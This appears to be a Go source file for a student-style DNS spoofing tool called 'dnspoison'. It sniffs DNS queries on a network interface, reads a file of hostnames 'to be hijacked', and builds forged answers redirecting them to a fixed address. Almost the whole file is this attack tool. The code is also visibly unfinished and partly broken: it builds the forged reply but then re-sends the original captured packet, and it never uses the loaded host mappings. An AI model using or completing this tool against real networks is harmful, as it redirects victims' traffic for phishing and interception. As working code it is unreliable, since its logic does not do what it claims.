package main

import (
	"fmt"
	"flag"
	"net"
	"strings"
	"io/ioutil"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// type DNS struct {
// 	BaseLayer

// 	// Header fields
// 	ID     uint16
// 	QR     bool
// 	OpCode DNSOpCode

// 	AA bool  // Authoritative answer
// 	TC bool  // Truncated
// 	RD bool  // Recursion desired
// 	RA bool  // Recursion available
// 	Z  uint8 // Reserved for future use

// 	ResponseCode DNSResponseCode
// 	QDCount      uint16 // Number of questions to expect
// 	ANCount      uint16 // Number of answers to expect
// 	NSCount      uint16 // Number of authorities to expect
// 	ARCount      uint16 // Number of additional records to expect

// 	// Entries
// 	Questions   []DNSQuestion
// 	Answers     []DNSResourceRecord
// 	Authorities []DNSResourceRecord
// 	Additionals []DNSResourceRecord
// 	// contains filtered or unexported fields
// }
func handlePacket(packet gopacket.Packet, handle *pcap.Handle) {
	// dt := packet.Metadata().CaptureInfo.Timestamp
	// fmt.Printf("%04d-%02d-%02d %02d:%02d:%02d.%d ", dt.Year(), dt.Month(), dt.Day(), dt.Hour(), dt.Minute(), dt.Second(), dt.Nanosecond())
	if dnslayer := packet.Layer(layers.LayerTypeDNS); dnslayer != nil {
		dnsdata, _ := dnslayer.(*layers.DNS)
		if !dnsdata.QR && dnsdata.QDCount > 0 {
			fmt.Println("Query for", string(dnsdata.Questions[0].Name))
			//
			ip4 := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
			udp := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
			dns := layers.DNS{
					ID: 		dnsdata.ID,
					QR:			true,
					OpCode:		dnsdata.OpCode,
					ResponseCode:		dnsdata.ResponseCode,
					QDCount:			1,
					ANCount:			1,
					Questions:	dnsdata.Questions,
					Answers:	[]layers.DNSResourceRecord{ layers.DNSResourceRecord{ 
						Name: dnsdata.Questions[0].Name,
						Type: layers.DNSType(1),
						Class: layers.DNSClass(1),
						TTL: 300,
						IP: net.IPv4(7, 7, 7, 7),
					}, },
					// Authorities: []layers.DNSResourceRecord{ layers.DNSResourceRecord{ Name: net.IPv4(7, 7, 7, 7) }, },
					// Additionals: []layers.DNSResourceRecord{ layers.DNSResourceRecord{ Name: net.IPv4(7, 7, 7, 7) }, },
				}
			//
			buf := gopacket.NewSerializeBuffer()
			ops := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			gopacket.SerializeLayers(buf, ops, 
				&layers.Ethernet{
					SrcMAC:		net.HardwareAddr{0x12, 0x34, 0x56, 0x78, 0x9a, 0xbf},
					DstMAC:		net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
				},
				&layers.IPv4{
					SrcIP:		ip4.DstIP,
					DstIP:		net.IPv4(255, 255, 255, 255),//ip4.SrcIP,
				},
				&layers.UDP{
					DstPort:	udp.SrcPort,
					SrcPort:	udp.DstPort,
				},
				&dns,
			)
			
			fmt.Println(udp.SrcPort)
			fmt.Println(udp.DstPort)
			fmt.Println(buf)

			if err := handle.WritePacketData(packet.Data()); err != nil {
				fmt.Println("Error transmitting packet")
				fmt.Println(err)
			}
		} else {
			fmt.Println("Response to", string(dnsdata.Questions[0].Name))
			// fmt.Println(dnsdata)
			// fmt.Println(packet)
		}
	}
}

/*
 * Code references and modifies usage examples from gopacket pcap documentation.
 */
func liveCapture(iface_name string, hostMap map[string]string, bpf string) {
	if handle, err := pcap.OpenLive(iface_name, 1024, true, pcap.BlockForever); err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter(bpf); err != nil {
		panic(err)
	} else {
		fmt.Println(hostMap)
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			handlePacket(packet, handle)
		}
	}
}

func loadHostfile(fname string, hostMap map[string]string) {
	if hostdata, err := ioutil.ReadFile(fname); err != nil {
		panic(err)	
	} else {
		lines := strings.Split(string(hostdata), "\n")
		for _, line := range lines {
			if mappings := strings.Fields(line); len(mappings) >= 2 {
				if len(mappings[1]) > 4 && mappings[1][:4] == "www." {
					hostMap[mappings[1][4:]] = mappings[0]
				} else {
					hostMap["www." + mappings[1]] = mappings[0]
				}
				hostMap[mappings[1]] = mappings[0]
			}
		}
	}
}

func main() {
	interfacePtr := flag.String("i", "", `Listen on network device <interface> (e.g., eth0). If not specified,
	    dnspoison should select a default interface to listen on. The same
	    interface should be used for packet injection.`)
	hostFilePtr := flag.String("f", "", `Read a list of IP address and hostname pairs specifying the hostnames to\
		be hijacked. If '-f' is not specified, dnspoison should forge replies to\
    	all observed requests with the chosen interface's IP address as an answer.`)
	flag.Parse()
	filter := strings.Join(flag.Args(), " ")
	
	hostMap := make(map[string]string)  
	if (*hostFilePtr != "") {
		loadHostfile(*hostFilePtr, hostMap)
	}

	interfaceList, _ := net.Interfaces()
	for _, iface := range interfaceList {
		if *interfacePtr == "" || iface.Name == *interfacePtr {
			addrs, _ := iface.Addrs()
			for _, address := range addrs {
				hostMap["*"] = address.String()
			}
			liveCapture(iface.Name, hostMap, filter)
			return
		}
	}
}
